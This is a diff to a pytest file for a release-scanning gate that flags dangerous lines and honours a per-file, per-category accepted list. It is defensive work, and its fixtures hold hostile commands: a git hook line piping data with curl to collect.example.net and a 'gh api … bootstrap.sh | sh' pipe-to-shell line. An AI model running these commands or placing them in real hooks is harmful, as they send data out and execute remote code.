@@ -43,6 +43,8 @@ def kit(tmp_path):
 
 def gate(kit: Path, old: str, new: str, *extra: str) -> subprocess.CompletedProcess:
     mirror = kit.parent / "mirror.git"
+    if "--accepted" not in extra:  # none accepted unless a test names a list: the repo's own is not read
+        extra = (*extra, "--accepted", str(kit.parent / "no-accepted.txt"))
     return subprocess.run([sys.executable, str(GATE), old, new, "--source", str(kit),
                            "--mirror", str(mirror), *extra], capture_output=True, text=True)
 
@@ -138,3 +140,51 @@ def test_the_kits_git_hooks_are_scanned(kit):
     release(kit, "v0.1.1", {".githooks/pre-commit.d/10-abs-paths": "curl -d @- https://collect.example.net\n"})
     r = gate(kit, "v0.1.0", "v0.1.1")
     assert r.returncode == 4 and "collect.example.net" in r.stdout
+
+
+PIPE = "print(f\"gh api .../bootstrap.sh | sh -s {seat}\")"
+
+
+def test_an_accepted_hard_line_is_read_not_hard(kit, tmp_path):
+    release(kit, "v0.1.1", {"bin/onboard.py": PIPE + "\n"})
+    ok = tmp_path / "accepted.txt"
+    ok.write_text(f"# the person's word\npipe to shell\tbin/onboard.py\t{PIPE}\n")
+    r = gate(kit, "v0.1.0", "v0.1.1", "--accepted", str(ok))
+    assert r.returncode == 1, r.stdout
+    assert "READ  accepted pipe to shell: bin/onboard.py:1" in r.stdout
+
+
+def test_an_accepted_line_that_changed_is_hard_again(kit, tmp_path):
+    release(kit, "v0.1.1", {"bin/onboard.py": PIPE.replace("sh -s", "bash -s") + "\n"})
+    ok = tmp_path / "accepted.txt"
+    ok.write_text(f"pipe to shell\tbin/onboard.py\t{PIPE}\n")
+    assert gate(kit, "v0.1.0", "v0.1.1", "--accepted", str(ok)).returncode == 4
+
+
+def test_the_same_text_in_another_file_is_hard_again(kit, tmp_path):
+    release(kit, "v0.1.1", {"bin/onboard.py": PIPE + "\n", "hooks/run.py": PIPE + "\n"})
+    ok = tmp_path / "accepted.txt"
+    ok.write_text(f"pipe to shell\tbin/onboard.py\t{PIPE}\n")
+    assert gate(kit, "v0.1.0", "v0.1.1", "--accepted", str(ok)).returncode == 4
+
+
+def test_an_acceptance_covers_its_own_category_only(kit, tmp_path):
+    release(kit, "v0.1.1", {"bin/onboard.py": PIPE + "\n"})
+    ok = tmp_path / "accepted.txt"
+    ok.write_text(f"persistence\tbin/onboard.py\t{PIPE}\n")
+    assert gate(kit, "v0.1.0", "v0.1.1", "--accepted", str(ok)).returncode == 4
+
+
+def test_a_malformed_accepted_list_is_unknown(kit, tmp_path):
+    release(kit, "v0.1.1", {"docs/NOTES.md": "x\n"})
+    ok = tmp_path / "accepted.txt"
+    ok.write_text("pipe to shell, no tab\n")
+    assert gate(kit, "v0.1.0", "v0.1.1", "--accepted", str(ok)).returncode == 3
+
+
+def test_the_repos_accepted_list_reads():
+    from importlib.util import module_from_spec, spec_from_file_location
+    spec = spec_from_file_location("kitgate", GATE)
+    m = module_from_spec(spec)
+    spec.loader.exec_module(m)
+    assert m.accepted(m.ACCEPTED)
